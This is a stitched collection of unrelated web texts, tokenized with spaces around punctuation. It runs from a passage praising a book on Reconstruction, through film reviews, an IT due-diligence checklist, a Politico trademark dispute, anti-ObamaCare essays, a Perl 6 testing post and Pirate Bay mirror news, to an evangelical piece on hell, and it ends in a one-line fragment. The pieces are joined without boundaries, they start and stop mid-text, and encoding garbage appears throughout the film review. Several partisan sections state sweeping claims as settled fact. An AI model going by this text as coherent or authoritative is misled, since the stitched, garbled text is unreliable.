The Republican Party , easily controlling new , black voters , established puppet governments in the conquered Southern states .
The party " used the power gained from this to plunder the taxpayers of the South for more than a decade after the war ended " ( p. 202 ) .
One might think such blatant corruption hard to defend , but a group of historians began the task in the 1930s .
Our author rightly notes that many of these historians were Marxists , but this is an understatement .
In fact , several of the movement 's leading lights , such as James Allen and W. E. B. DuBois , found Lenin greatly to their liking ; and the Communist Party actively propagated the new line .
By smearing the older view as racist and pro-Southern , the new partisans triumphed .
DiLorenzo will have none of this nonsense , and he patiently dissects their sophisms .
A chief method of the group is the misleading comparison .
These Marxist and ' liberal ' revisionists argue that Reconstruction was n't all that bad compared to , say , what happened when the Japanese invaded Nanking in the 1930s .…
After all , Kenneth Stampp has argued , there were not even any mass executions of former Confederates after the war .
( p. 203 )
The unstated premise of Stampp 's argument is that Southerners were enemy aliens who deserved whatever their Northern masters dished out to them ; if so , anything less than total terror counts as merciful .
Had Stampp , no doubt preoccupied with World War II , not presupposed this , he would have seen that a bad policy does not become good because worse things are possible .
In like fashion , Eric Foner , the reigning pontiff of the new school , has some good words for the Radicals ' corruption .
Was not the situation even worse in the North ?
DiLorenzo's reply strikes its target exactly :
The fact that corruption was even worse in the North proves the Dunning School 's point ; since massive corporate welfare was relatively new to the South , it had n't quite equaled the North in terms of political corruption .
The expansion of government , which Reconstruction facilitated , caused such corruption . " ( pp. 231–32 )
This outstanding book has left me at wit 's end .
As everyone knows , I like to charge authors with having committed logical fallacies ; but Professor DiLorenzo offers me almost nothing .
At only one point do I think I have caught him out .
In reply to those who criticize Dunning for racism , since he doubted the wisdom of at once extending the vote to uneducated blacks , DiLorenzo notes that these same critics " virtually deify " Lincoln ( p. 204 ) .
But Lincoln was a white supremacist of the first order .
To be consistent , must not those historians who dismiss Dunning 's interpretations as racist " be just as skeptical of what has been written about Lincoln over the past 100 years and even reevaluate much of their own scholarship ? " ( p. 204 ) .
" A bad policy does not become good because worse things are possible . "
So drastic a conclusion does not follow .
Consistency requires these historians only to discount Lincoln 's racist remarks ; they may admire Lincoln for other reasons , without sinning against logic .
A few minor points should be noted : some states opposed the Virginia and Kentucky Resolutions ( p. 111 ) ; not all Whigs favored the American System — John Tyler was a Whig as much as Henry Clay ( p. 235 ) ; and the author of the article discussed on p. 231 was Stanley Coben , not " Cohen . "
My frustration at being able to find so little wrong with the book will not prevent me from congratulating Professor DiLorenzo on a magnificent contribution to history .
It is vital reading for anyone concerned with the defense of liberty .

THE COLLECTOR , Review – American Horror Worth Championing .
Posted by Peter Hall - July 23rd 2009 @ 11:55 am
If we ’re going on track records alone , I ’m not the kind of person who should be cheerleading THE COLLECTOR .Â
I ’m rather indifferent to the first FEAST , but do n’t care for the sequels .
Â
I stopped being interested in the SAW franchise after part two , which admittedly is before Dunstan and Melton took over subsequent sequels , leaving that less to do with them and more to do with SAW , by act of inheritance , being a fluke worm that behaves the same no matter how many parts you cut up into .
Â
Yet it is still impossible to overlook the fact that Dunstan and Melton wrote parts 4 through 7 , so the idea of another similarly themed Dunstan / Melton torture team up initially seems capable of being little more than an untrademarked SAW sequel .
It is n’t .
Â THE COLLECTOR may be a lot of things and may feature a house full of traps , but a SAW franchisee it ain’t .
Â
Not by a long shot .
Â Â Dunstan ’s directorial debut is a response to needs I ’m so accustomed to being disappointed by that I think I ’d subconsciously given up hope on finding a film that packages them all together .
Â
Finally an American horror movie that is brutal without being a freak show .
Â
An American horror movie that is a legitimate throw back to an era gone by without having to yuck it up .
Â
An American horror movie that tortures people without devolving into torture porn .
Â
An American horror movie made outside of a major studio umbrella that does n’t give a shit how small its budget may be , that does n’t have to shortcut tough logistics with insert shots and cutaways .
Yes , THE COLLECTOR is a good horror movie no matter what country it comes from , but that it ’s an American horror movie made with a budget that might barely cover craft services on Platinum Dunes production is a great thing to me .
The pitch is simple .
Â
A thief breaks into a house the same night a serial killer sets up shop inside .
Â
The execution is n’t .
Â
The killer ’s MO is to layer the house with traps with the intent of ‘ collecting ’ whoever proves to be the most formidable opponent .
Â
It ’s a very SAW - ey plot device , but there are three keystones that distinguish it from Twisted Picture ’s popular phenom .
Â
First , the traps , which are not absurdly complex devices it would take the Army Core of Engineers led by Data from THE GOONIES to conceive and build .
Â
There are a few levers and winches involved , but for the most part the threats are as rudimentary as a dark room full of things that should n’t be touched even with a spotlight on them .
Â
Think of it as HOME ALONE with a blood lust .
Â
If a chandelier with kitchen knives attached to it is introduced in act one , it ’s gonna fall on someone by the end of the show .
Second , THE COLLECTOR ’s tight grab for morality .
Â Arkin , the main character , is a criminal because he has to be to support his family .
Â
The basic conflict inherent to a reluctant thief who faces the choice of helping the very people he was trying to violate is by itself an interesting dynamic , but once the blood starts flowing and the bones start crunching , Arkin could be anyone .
Â
It no longer matters that he ’s a thief , it only matters whether he decides to find a way out and save himself or help the family still trapped inside .
Â
After all the crap that gets thrown at him , you start to root for Arkin , to pull for him to just make it out alive , parents and little girl be damned .
Â
It ’s a great arch for a character captured perfectly by Josh Stewart and despite other considerable strong points , it is the best thing about the film .
The third savior is Marcus Dunstan .
Â
With his debut Dunstan has proven to be a better director than a writer .
Â
He keeps his camera on a tight leash when following the action , completely abandoning every aspect of the SAW films that I hate .
Â
No spinning camera , no editing room seizures , no set direction grungier than a NYC sewer pipe .
Â
It ’s a very measured take on the extreme events that ratchets tension with a build up instead of trying to snatch your attention with a sudden onslaught of gore .
Â
There is nothing in THE COLLECTOR that comes off as rushed .
Â Arkin never panics and neither does Dunstan ’s camera .
Â
He lets the great pounding of the score do the panicking , which is something I wish more horror movies remembered to do these days .
Maybe it ’s because the film ended up being the opposite of what I was expecting .
Â
Maybe I liked it so much because of the things it could have been but was n’t .
Â
I ’m not sure that ’s the best way to approach it , but when so often you see the same thing over and over in a horror movie it is a welcome respite to cross a title that does n’t blend in with the sea of horror .
Â THE COLLECTOR stands out as a film that resists compromise on the page and on the screen .
Â
My only outstanding problem with the film are a few snags in the script , most notably the ending .
Â
There ’s no shock - of - all - shocks twist to it ( as well there should n’t be ) that muddys things , but it is the only element of the movie that seems incongruous with the calm insanity of what came before , as if it is playing to an audience instead of playing to the story .
Â
It ’s not a bad conclusion , I ’m just a greedy fan and want things to end the way I would have ended them .
Other than that selfish complaint , I ’m happy to finally have a Marcus Dunstan / Patrick Melton movie I can stand behind .
Â
I ’m glad the Project Greenlight fellas have found great success with SAW and FEAST , but I hope they keep striking out on their own like this .
Â THE COLLECTOR is easily the best American horror film so far this year and , looking at what ’09 still has left to offer us , I ’ll be shocked if it does n’t stay that way .

12 More Ways to Spot IT Lies and Omissions in Due Diligence
I talked about Due Diligence in a previous article , and gave you 13 ways to spot lies and deception .
Here ’s an additional list that ’s specific to Information Technology , although you can probably see parallels in other types of due diligence :
12 More Ways to Spot IT Lies and Omissions
The current solution does n’t scale up
Maybe there ’s a small - scale version of a certain capability working , but it ’s not ready for the large - scale production you ’re going to need .
For example , a certain process is done by hand , and is n’t yet ready for mass production .
The current solution does n’t scale down
This is less common , but still a concern .
Sometimes a system only works for large volumes , and is n’t cost - effective when scaled down to lower volumes .
That can be a concern in a fluctuating economy .
The seller is evasive on version numbers and specific types of hardware and software
This is often a tip - off that the seller is using outdated equipment or unsupported software versions .
It can also mean that the seller is using unlicensed software .
The number of people in an area does n’t make sense
You ’re given an organization chart that shows a certain number of people in an organization , but you know from personal experience that this number is too high or too low for the work that needs to be done .
Omitted business functions
Think about the processes and business functions that need to be performed in a company like this .
Have you gotten a description of the people and systems for every one of them ?
If not , then how are they done ?
Are they outsourced ?
Has certain information been held back ?
Customer list does n’t match revenue
Either the seller is claiming more revenue than can be accounted for , or the revenue seems low given the number of customers the seller is claiming .
Either way , further investigation is needed .
Lack of clarity around ownership of rights
For any proprietary software or hardware that is being used by the seller , it ’s important to get a legal document from the seller stating that they have complete intellectual property rights for that software or hardware .
If any part of the development of that software or hardware was outsourced or subcontracted , then the seller should be able to produce legal documents that show that the outside resource holds no rights .
Informal subcontractors
If the seller uses an informal arrangement with subcontractors where they may legally own rights to some of their work , then you may be in trouble on the purchase .
You may have to get signed documents from every current and previous subcontractor assigning the rights to the seller .
Person who did the work is no longer with the company
This introduces two issues : ( a ) intellectual property rights , and ( b ) the possibility that no one currently with the company knows enough about the previous work done to maintain it or enhance it .
There is no ( or not enough ) budget for maintenance and replacement of equipment
In some cases the seller will strip “ unnecessary ” items like maintenance and equipment replacement out of the budget so that the P&L ( profit and loss statement ) will look better .
No contingency or disaster plans
Like # 10 , in many cases the seller will try to operate without any contingency or disaster plans in an effort to minimize cost .
This obviously introduces a high degree of risk for the business .
Lost in technology translation
This is like # 13 from the first list but it refers to the situation where a business claim is made by the seller that ca n’t be supported by the technology the seller is using .
For example , the seller claims 24×7 system availability , but only has one server with no fault tolerance .
The College Politico has received a cease - and - desist letter from lawyers for Politico , demanding that he stop using the word “ Politico ” in his name — and that he give them control of his domain .
Stephen Gutowski , the operator of the domain , has broken several stories , including one that proved that Obama=Hitler signs were being wielded by Lyndon LaRouche supporters .
Spread the word far and wide : we will not stand for such thuggish tactics .
UPDATE : Until this threat is withdrawn , I plan to boycott Politico , and I encourage others to do the same .
UPDATE x2 : The word “ politico ” is in the dictionary .
It means “ politician . ”
What other ordinary words do we not get to use in naming blogs ?
UPDATE x3 : I have a call in to Lisa H. Glassman , the lawyer who wrote the cease - and - desist letter .
UPDATE x4 : Another example of Politico ’s thuggery here .
Thanks to happyfeet .
UPDATE x5 : Thanks to Instapundit for the link .
Here ’s the letter :
“ We have to do something ! ”
This cry is sounded repeatedly by those who are demanding some type of health care reform from President Obama .
Its hard to argue with their logic .
After all , health care costs are soaring and [ according to some ] there are nearly 50 million Americans lacking health insurance ( although they are not without health care itself ) .
Insurance premiums are rising faster than income , and Medicare will run out of money in 2019 , potentially leaving millions of retirees without coverage , or causing taxes or government borrowing to rise rapidly .
I agree that something needs to be done .
However , I disagree about what exactly should be done .
Even the proponents of the Congressional plan agree that it is far from perfect , but they continue to repeat the mantra that “ we have to do something . ”
Well , we do have to do something , right ?
The American people arent so sure .
According to a new Rasmussen poll , 54 % of American voters–a larger majority than the percentage of Americans who voted for President Obama–believe that passing no health care reform would be a better option than passing the plan currently before Congress .
Only 35 % say that the current bill would be better than “ doing nothing . ”
And it is now being reported that the President has dropped his demand for a “ public option . ”
If this is true , it could leave behind an expensive bill that does little to change the current system .
This plan is being pushed through Congress at a rapid pace .
President Obama has set artificial deadlines for when he wants legislation on his desk , yet health care reform is a massively complex issue that a new administration shouldnt reasonably expect to tackle in such a short time .
How this Nation to decide on a complex long term health care reform plan in only a matter of weeks ?
I am one of the 54 % of American voters who prefers “ doing nothing ” over passing the current plan .
However , that doesnt mean I favor doing nothing in general .
Here are some of my ideas for health care reform :
1 ) End ( or significantly reduce ) income taxes for individuals working as medical doctors , nurses , medical practitioners , etc .
Doing this could dramatically lower the costs of medical care .
Ending or cutting income taxes for medical workers will essentially allow them to earn the same amount of money for charging less for their services .
This would also encourage those considering becoming nurses or medical staff to return to school and become certified in their fields , as well as encourage older medical workers to work for several more years ( if they are able to keep more of their earnings , they could be more willing to work longer ) .
While this could add to the National debt if spending is not cut , the Nation would save a considerable amount of money in added health care costs .
And of course , I would support this plan only if it included spending cuts to balance out the lost revenues .
2) End ( or significantly reduce ) immigration restrictions for individuals working as medical doctors , nurses , medical practitioners , etc .
Ultimately , costs in any industry , including health care , are dependent on supply and demand .
Any doctor , nurse , x-ray technician , etc. who is able to speak English should be offered instant American citizenship .
There are large numbers of such people all over the world who are interested in becoming American citizens , but who are unable to do so because of current immigration laws .
3 ) Allow insurance companies to sell plans across State lines .
Federal law currently prevents insurance companies from selling plans across State lines .
This is just plain illogical .
This leads to inefficiencies and increased costs for both the business and the consumer .
Imagine if cell phone companies had to comply with similar restrictions–a company like Verizon would be prevented from having a National plan , they would have to have a different plan and pricing scheme for each State and D.C , and the cell phone user ’s costs would be higher as a result .
The same is true for health insurance .
Allowing insurance companies to sell plans across State lines would essentially create a National insurance market where customers could go online to a site like e-healthinsurance.com and select a plan from companies headquartered anywhere in the Nation .
Taking this step would also allow insurance companies to cut unnecessary staff –potentially passing savings on to consumers .
There is no reason for a company like Blue Cross to have to have 51 different organizations to create and price different insurance plans .
Remember that just because we “ have to do something ” does not mean that we should have to do “ anything . ”
There are good as well as bad reforms , just as there are good and bad treatments for any disease .
A doctor with a seriously ill patient should look at all the options and diagnose the patient carefully and as accurately as possible before treating the patient .
Treating the patient before diagnosing him and reviewing all of the options could be catastrophic .

A few times per week we ( the Rakudo development team ) update our spectest graph which shows how many tests Rakudo passed in the past and now , and how many tests there are in the official test suite .
This is a very useful information , but still its use is limited .
Among other reactions we also received two kinds of responses that I want to talk about .
One is " And when Rakudo passes all tests , Perl 6 is ready , right ? " , the other is " I do n't care how many tests you pass until it 's 100 % ( the latter seen in a reddit or Y - combinator comment , for example ) .
Implications
The first reaction points to a larger problem - how can we know if our tests actually cover the whole specification ?
The answer is we can 't .
Ever .
We can identify parts of the spec that are very well covered by tests ( for example multi dispatch ) , and parts that are covered badly or not at all ( IO , and way too many other areas ) .
But there is a huge number of ways the various parts of the specification interact ( growing exponential in the number of specified facts ) , which makes it impossible to reach complete covering .
Still we can read each paragraph in the specs and see if we have an appropriate test , achieving some kind of shallow coverage .
But worse still there are many things implicit but not explicit in the spec .
I write " worse " because for the test suite writer it's a pain , but on the other hand if everything was stated explicitly , we 'd waste too much time on trivialities .
One example is a bug which Rakudo had in the beginning : recursion would screw up some lexical variables rather badly .
When Patrick and Jonathan looked into fixing it , I wanted to contribute my part and provided some tests .
And then I did n't know where to put them .
The specs talk about subroutines , and about lexical variables .
But it does not talk about the interaction between recursion and lexicals - because it 's obvious that each instance of a function gets its own lexical pad on recursion .
Perl 5 does this just fine , we carry that semantics over to Perl 6 .
Perfectly sane , but it's an implication nonetheless .
And , after much talking , I finally come to my first main point :
We can't measure test coverage of such implications .
We have no automatic way to turn implications into explicit statements either .
We can't know if spec and the implications have a decent test coverage .
We wo n't ever reach 100 % passing tests
Most people consider Perl 5 " done " .
Not in the sense that there 's nothing left to do , but that there are stable releases , wide acceptance , on generally technical and social maturity .
And yet Perl 5 does not pass all of its test .
It might come as a shock to you if you have n't looked at Perl 5's source tree , and never compiled it from source and run the tests ( and actually looked at the results ) , but it 's true .
$ ~ /tmp/ perl > ack - w ' skip ( ?:_all ) ? ' t|wc -l 381 $ ~ /tmp/ perl > ack - w ' todo ' t|wc -l 48
There are many valid reasons why some tests should not be run - for example the tested feature might not be available on the current platform , or maybe a previous failure would make their outcome inconclusive .
There are also valid reasons why some tests are marked as TODO ( which means they are run , but do n't pass ) - for example to test a bug that is not yet fixed , or for behavior that is subject to change but has not yet been adapted .
So even with huge efforts our chances of ever unconditionally passing each and every test in the Perl 6 test suite are practically 0 .
When a run over the whole test suite shows that all tests passed , the first thing I 'll do is to check our test module and test harness for errors - maybe some bug prevented them from successfully identifying errors .
If you compare how the tests for Perl 5 and Perl 6 were originally written , you 'll see that in the case of Perl 5 a huge amount was written against a working implementation , while many Perl 6 tests were whipped up by reading the spec and transforming it into code , or even as feature requests for pugs .
So it wo n't surprise you that in the Perl 6 test suite there is a larger amount of contradictory tests , written either against different versions of the specification , or by various people who understood the spec differently .
We 'll work hard to weed out such contradictions , but it would be an illusion to assume that we will fully succeed .
Are you moody ?
When you read the previous paragraphs you might think I 'm moody , and quite negative about Perl 6 .
I 'm not .
I just faced the reality that each software project of at least modest complexity faces , and brain - dumped it here .
In fact I 'm quite optimistic .
Many areas of Perl 6 improve at an impressive rate these days : the specification , Rakudo , smop + mildew , the websites , available libraries and applications , and last but not least : the community .
Having written quite some Perl 6 code ( see my SVG related posts on this blog ) over the previous weekend I think that developing Perl 6 has never been more fun - at least not to me ;-)
Three would be rockers Chazz , Rex and Pip , known as The Lone Rangers plan to play their demo on a recording company , but then they 're turned down rudely .
Then they decide to try the famous rock n' roll radio station , but are not accepted either .
Then they decide arm themselves with squirt guns and take the station hostage for not playing their demo .
But the three get more than what they have bargained for .

Goodbye , Pirate Bay .
Hello , Pirate Bay .
A couple of days ago we wrote about a very special torrent , which contained a copy of the entire Pirate Bay with most of the torrents in its database .
Now , someone has put it to use : you can find a fully functional copy of the Pirate Bay over at btarena.net .
The new site is not exactly the same as the old one , and some of The Pirate Bay 's functions , such as links to related content , are missing , but who cares ?
It works , and the torrents are there , so users can keep visiting the new site almost as if nothing has changed .
Of course , whether the new site will remain as popular as the original Pirate Bay ( new torrents will be tracked via tracker.btarena.org ) remains to be seen , but the simple fact has once again been proven : you can turn one torrent tracker off , but new ones will always appear and take over .
The entertainment industry would do well if they stopped bothering with lawsuits towards individual services and started working on being competitive in light of new marketplace rules , brought forth by the internet .

The government 's initial step in attempting to create a government - run healthcare monopoly has been to propose a law that would eventually drive the private health insurance industry out of existence .
Additional taxes and mandated costs are to be imposed on health insurance companies , while a government - run " health insurance " bureaucracy will be created , ostensibly to " compete " with the private companies .
The hoped - for end result is one big government monopoly which , like all government monopolies , will operate with all the efficiency of the post office and all the charm and compassion of the IRS .
Of course , it would be difficult to compete with a rival who has all of his capital and operating costs paid out of tax dollars .
Whenever government " competes " with the private sector , it makes sure that the competition is grossly unfair , piling costly regulation after regulation , and tax after tax on the private companies while exempting itself from all of them .
This is why the " government - sponsored enterprises " Fannie Mae and Freddie Mac were so profitable for so many years .
It is also why so many abysmally performing " public " schools remain in existence for decades despite their utter failure at educating children .
America 's Healthcare Future ?
Some years ago , the Nobel - laureate economist Milton Friedman studied the history of healthcare supply in America .
In a 1992 study published by the Hoover Institution , entitled " Input and Output in Health Care , " Friedman noted that 56 percent of all hospitals in America were privately owned and for - profit in 1910 .
After 60 years of subsidies for government - run hospitals , the number had fallen to about 10 percent .
It took decades , but by the early 1990s government had taken over almost the entire hospital industry .
That small portion of the industry that remains for - profit is regulated in an extraordinarily heavy way by federal , state and local governments so that many ( perhaps most ) of the decisions made by hospital administrators have to do with regulatory compliance as opposed to patient / customer service in pursuit of profit .
It is profit , of course , that is necessary for private - sector hospitals to have the wherewithal to pay for healthcare .
Friedman 's key conclusion was that , as with all governmental bureaucratic systems , government - owned or - controlled healthcare created a situation whereby increased " inputs , " such as expenditures on equipment , infrastructure , and the salaries of medical professionals , actually led to decreased " outputs " in terms of the quantity of medical care .
For example , while medical expenditures rose by 224 percent from 1965 – 1989 , the number of hospital beds per 1,000 population fell by 44 percent and the number of beds occupied declined by 15 percent .
Also during this time of almost complete governmental domination of the hospital industry ( 1944–1989 ) , costs per patient - day rose almost 24 - fold after inflation is taken into account .
The more money that has been spent on government - run healthcare , the less healthcare we have gotten .
This kind of result is generally true of all government bureaucracies because of the absence of any market feedback mechanism .
Since there are no profits in an accounting sense , by definition , in government , there is no mechanism for rewarding good performance and penalizing bad performance .
In fact , in all government enterprises , exactly the opposite is true : bad performance ( failure to achieve ostensible goals , or satisfy " customers " ) is typically rewarded with larger budgets .
Failure to educate children leads to more money for government schools .
Failure to reduce poverty leads to larger budgets for welfare state bureaucracies .
This is guaranteed to happen with healthcare socialism as well .
Costs always explode whenever the government gets involved , and governments always lie about it .
In 1970 the government forecast that the hospital insurance ( HI ) portion of Medicare would be " only " $ 2.9 billion annually .
Since the actual expenditures were $ 5.3 billion , this was a 79 percent underestimate of cost .
In 1980 the government forecast $ 5.5 billion in HI expenditures ; actual expenditures were more than four times that amount — $ 25.6 billion .
This bureaucratic cost explosion led the government to enact 23 new taxes in the first 30 years of Medicare .
( See Ron Hamoway , " The Genesis and Development of Medicare , " in Roger Feldman , ed. , American Health Care , Independent Institute , 2000 , pp. 15 -86 ) .
The Obama administration 's claim that a government takeover of healthcare will somehow magically reduce costs is not to be taken seriously .
Government never , ever , reduces the cost of doing anything .
All government - run healthcare monopolies , whether they are in Canada , the UK , or Cuba , experience an explosion of both cost and demand — since healthcare is " free . "
Socialized healthcare is not really free , of course ; the true cost is merely hidden , since it is paid for by taxes .
Whenever anything has a zero explicit price associated with it , consumer demand will increase substantially , and healthcare is no exception .
At the same time , bureaucratic bungling will guarantee gross inefficiencies that will get worse and worse each year .
As costs get out of control and begin to embarrass those who have promised all Americans a free healthcare lunch , the politicians will do what all governments do and impose price controls , probably under some euphemism such as " global budget controls . "
Price controls , or laws that force prices down below market - clearing levels ( where supply and demand are coordinated ) , artificially stimulate the amount demanded by consumers while reducing supply by making it unprofitable to supply as much as previously .
The result of increased demand and reduced supply is shortages .
Non-price rationing becomes necessary .
This means that government bureaucrats , not individuals and their doctors , inevitably determine who will get medical treatment and who will not , what kind of medical technology will be available , how many doctors there will be , and so forth .
All countries that have adopted socialized healthcare have suffered from the disease of price - control - induced shortages .
If a Canadian , for instance , suffers third - degree burns in an automobile crash and is in need of reconstructive plastic surgery , the average waiting time for treatment is more than 19 weeks , or nearly five months .
The waiting time for orthopaedic surgery is also almost five months ; for neurosurgery it 's three full months ; and it is even more than a month for heart surgery ( see The Fraser Institute publication , Waiting Your Turn : Hospital Waiting Lists in Canada ) .
Think about that one : if your doctor discovers that your arteries are clogged , you must wait in line for more than a month , with death by heart attack an imminent possibility .
That 's why so many Canadians travel to the United States for healthcare .
All the major American newspapers seem to have become nothing more than cheerleaders for the Obama administration , so it is difficult to find much in the way of current stories about the debacle of nationalized healthcare in Canada .
But if one goes back a few years , the information is much more plentiful .
A January 16 , 2000 , New York Times article entitled " Full Hospitals Make Canadians Wait and Look South , " by James Brooke , provided some good examples of how Canadian price controls have created serious shortage problems .
A 58 - year - old grandmother awaited open - heart surgery in a Montreal hospital hallway with 66 other patients as electric doors opened and closed all night long , bringing in drafts from sub - zero weather .
She was on a five - year waiting list for her heart surgery .
In Toronto , 23 of the city 's 25 hospitals turned away ambulances in a single day because of a shortage of doctors .
In Vancouver , ambulances have been " stacked up " for hours while heart attack victims wait in them before being properly taken care of .
At least 1,000 Canadian doctors and many thousands of Canadian nurses have migrated to the United States to avoid price controls on their salaries .
Wrote Mr. Brooke , " Few Canadians would recommend their system as a model for export . "
Canadian price - control - induced shortages also manifest themselves in scarce access to medical technology .
Per capita , the United States has eight times more MRI machines , seven times more radiation therapy units for cancer treatment , six times more lithotripsy units , and three times more open - heart surgery units .
There are more MRI scanners in Washington state , population five million , than in all of Canada , with a population of more than 30 million ( See John Goodman and Gerald Musgrave , Patient Power ) .
In the UK as well — thanks to nationalization , price controls , and government rationing of healthcare — thousands of people die needlessly every year because of shortages of kidney dialysis machines , pediatric intensive care units , pacemakers , and even x-ray machines .
This is America 's future , if " ObamaCare " becomes a reality .
Is hell real ?
Well , according to a recent survey by the Pew Forum on Religion and Public Life , Americans are much more likely to believe that there is a heaven than that there is a hell .
According to their research , only 59 percent of Americans believe that hell is real , while approximately 74 percent of Americans believe that there is a heaven .
But does n’t a belief in heaven usually go along with a belief in hell ?
Well , the reality is that American clergy have increasingly avoided the topic of hell in recent years .
Reverand Fred Johns , the pastor of Brookview Wesleyan Church in Irondale , Alabama recently made the following honest admission about why American preachers avoid the topic of hell so much :
“ It ’s out of fear we ’ll not appear relevant , ” he admitted .
“ It ’s pressure from the culture to not speak anything negative .
I think we ’ve begun to deny hell .
There ’s an assumption that everybody ’s going to make it to heaven somehow . ”
The shocking truth is that in the vast majority of churches across the United States , any discussion of hell has almost completely disappeared .
Even in most evangelical churches , the reality of hell is rarely mentioned any longer as even evangelical churches now consider the idea of hell to be “ too negative ” to preach from the pulpit .
A number of months ago , the San Francisco Chronicle published an article entitled “ Hell losing its fire in American sermons ” that contained some very revealing quotes .
For example , the Chronicle quoted Bruce Shelley , a senior professor of church history at Denver Theological Seminary as saying this : “ Churches are under enormous pressure to be consumer - oriented .
Churches today feel the need to be appealing rather than demanding . ”
The Chronicle also quoted Bill Faris , the pastor of Crown Valley Vineyard Christian Fellowship as saying this : “ It is n’t sexy enough anymore . ”
Hell is n’t “ sexy ” enough anymore ?
What in the world ?
For those who are familiar with the changing Christian landscape in the United States , this actually should not come as much of a surprise .
The truth is that churches are increasingly becoming “ consumer oriented ” with much more of an emphasis on improving the quality of this current life rather than considering what will happen in the next life .
But is hell actually real ?
Are there people who have died who are there right now ?
Well , there is one man who is traveling throughout the United States that says that he has actually been there .
Bill
Wiese claims that he was actually in hell for 23 minutes , and that it was the most unforgettable experience of his entire life .
Now he travels America describing the unspeakable misery that lost souls have to endure there .
Bill
Wiese claims that he witnessed the searing flames of hell , felt total isolation , experienced the putrid smell of rotting flesh , heard deafening screams of agony , and saw terrifying demons .
At the end of Bill Wiese ’s experience , he claims that the strong hand of God lifted him out of the pit .
He also says that Jesus told him this : “ Tell them I am coming very , very soon ! ”
It took him about a year just to settle down from his experience in hell .
After his life changing ordeal , he spent seven years studying the Scriptures to find answers about what he experienced there .
The reality is that everyone is curious about what the afterlife is like , and in the video linked to below , Wiese shares his insights to commonly asked questions such as these :
* Is hell a literal burning place ?
* Where is hell ?
* Do you have a body in hell ?
* Are there degrees of punishment in hell ?
* Are there children in hell ?
* Can demons torment people in hell ?
* Can “ good ” people go to hell ?
So before you completely dismiss the idea of hell , perhaps you should watch this video .
But is it fair that some people are going to be sent to hell ?
Have you ever thought about that question much , because the reality is that it is a very important question .
Is it really and truly fair that some people are going to hell instead of heaven ?
After all , why not just let everyone into heaven and make everyone happy ?
It ’s a fair question .
So what is the answer ?
Well , one concept that is incredibly clear in the Scriptures is that God seems to really value the idea of meaningful choice .
It appears that it was very important to God to create humanity with free will and to hold us responsible for the choices that we have made .
After all , if we did not have free will we would just be a bunch of robots .
And robots cannot love , so in order to have real love you need people who can make real choices .
God gave us the ability to love and the ability to do good or to do evil .
But if there was never any consequences for evil , what would that say about God ?
Let ’s illustrate this with a scenario …..
Imagine that your mother was just raped and tortured brutally by some sick , twisted , perverted man who had been doing the same thing to other women for years upon years .
How would you feel if that actually happened ?
It is quite likely that you would be exploding with anger .
You probably would not even be able to see straight because of your anger .
Your very soul would be absolutely crying out for justice .
But then you receive some good news – the rapist has been caught by police and now he is going to go before the judge .
You feel ( perhaps naively ) that now you are going to get some real justice .
However , at the trial , the judge dismisses all the charges and says to the rapist : “ Well , you made a few little mistakes , but you are alright with me dude … … let ’s go hit the bars .
I need a drink .
Case dismissed ! ”
Now how would that make you feel ?
What would you think about that judge ?
Well , the truth is that evil deserves to be punished , and any judge that refuses to punish evil is a wicked judge .
What if God said this to Adolf Hitler : “ Ah I see you killed six million Jews , but I ’m cool with that …… come and let me show you around your mansion . ”
Would God say that ?
Of course God would never say that !
Anyone who thinks
God is like that is totally delusional .
The truth is that God is a God of perfect love AND a God of perfect justice .
Evil deserves to be punished , and God is most certainly going to punish it .
Imagine if all the serial killers , rapists and all the other most horrible criminals that you can think of got away with their wickedness not only here on earth but also in eternity as well .
Would that be fair ?
Would that be just ?
Imagine if all child rapists got away with their wicked crimes and never , ever , ever received any punishment for them .
Would that be fair ?
Would that be just ?
Of course not .
The truth is that everyone is going to face the justice of God some day .
Are you ready for that ?
The truth is that most people raise this issue because they do n’t want to be accountable to God or to anyone else .
The reason that so many critics of Christianity bring this up is that people do not trust God ’s punishment to be just .
But God IS going to be perfectly just .
But most of us do not like to think that we deserve any punishment .
Those who are guilty rarely think they deserve their punishment , while those who are on the outside looking in usually feel that the guilty deserve even more punishment .
To illustrate this , take a trip to a prison some time and ask the inmates if they got what they deserved .
The truth is that the vast majority of them would not would admit that they got what they deserved .
But most of them did get what they deserved , and some day we will stand before God and He will judge us .
So what do we truly know about the coming judgment ?
Well , the Scriptures do tell us that there will be varying levels of judgement :
Matthew 11:20 - 24
Then Jesus began to denounce the cities in which most of his miracles had been performed , because they did not repent .
“ Woe to you , Korazin !
Woe to you , Bethsaida !
If the miracles that were performed in you had been performed in Tyre and Sidon , they would have repented long ago in sackcloth and ashes .
But I tell you , it will be more bearable for Tyre and Sidon on the day of judgment than for you .
And you , Capernaum , will you be lifted up to the skies ?
No , you will go down to the depths .
If the miracles that were performed in you had been performed in Sodom , it would have remained to this day .
But I tell you that it will be more bearable for Sodom on the day of judgment than for you . ”
So is your judgment going to be the same as that for Satan or for the person next to you ?
The Scriptures seem to indicate that it will not be .
God is just , and we can trust God that all of his judgments will be perfectly just .
We do not need to worry about that .
But the reality is that the Scriptures very clearly tell us that there is punishment for sin .
Just consider the following portion of Scripture …..
Revelation 20:10 - 15
And the devil , who deceived them , was thrown into the lake of burning sulfur , where the beast and the false prophet had been thrown .
They will be tormented day and night for ever and ever .
Then I saw a great white throne and him who was seated on it .
Earth and sky fled from his presence , and there was no place for them .
And I saw the dead , great and small , standing before the throne , and books were opened .
Another book was opened , which is the book of life .
The dead were judged according to what they had done as recorded in the books .
The sea gaveup the dead that were in it , and death and Hades gave up the dead that were in them , and each person was judged according to what he had done .
Then death and Hades were thrown into the lake of fire .
The lake of fire is the second death .
If anyone ’s name was not found written in the book of life , he was thrown into the lake of fire .
That does not sound like a pleasant scene .
So is there any good news ?
Yes !
As we mentioned previously , God is a God of perfect love and a God of perfect justice .
God loves you and He sent His Son to die for you on the cross .
Jesus took your punishment on Himself at the cross .
Jesus paid for all the sins of mankind as He suffered and died on the cross .
You see , being a man , Jesus could die for the sins of men .
And being God , Jesus could die for an infinite number of sins .
The truth is that we all stand guilty before God , but out of His great love for us , Jesus willingly died in our place and took the penalty for our sins .
What incredible love !
Justice has been satisfied , so now God can offer you forgiveness of your sins and eternal life as a free gift .
If you will ask Jesus into your life , you can have eternal life in heaven with Him , and that is amazing news !
It is those who receive the gift of forgiveness that Jesus purchased for us that will have eternal life in heaven …..
I John 5:11 - 13
And this is the testimony : God has given us eternal life , and this life is in his Son .
He who has the Son has life ; he who does not have the Son of God does not have life .
I write these things to you who believe in the name of the Son of God so that you may know that you have eternal life .

The rise of Mexican medical tourism .
Ciudad Juárez , Mexico , is a bleak , dusty factory town across the border from El Paso , Texas .
